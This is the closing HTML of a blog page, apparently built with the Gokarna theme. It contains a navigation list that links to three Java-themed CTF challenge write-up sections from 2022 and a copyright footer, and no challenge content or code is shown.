    <li><a href="#tsctf2022mrctf2022-ezjava">tsctf2022(mrctf2022) ezjava</a></li>
    <li><a href="#鹏程杯2022-ez_java">鹏程杯2022 Ez_java</a></li>
    <li><a href="#dest0g3-520-迎新赛-ljctr">Dest0g3 520 迎新赛 ljctr</a></li>
  </ul>
</nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    <span>&copy; 2022 </span>
    <span>
        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
    </span>
</footer>
</body>
</html>
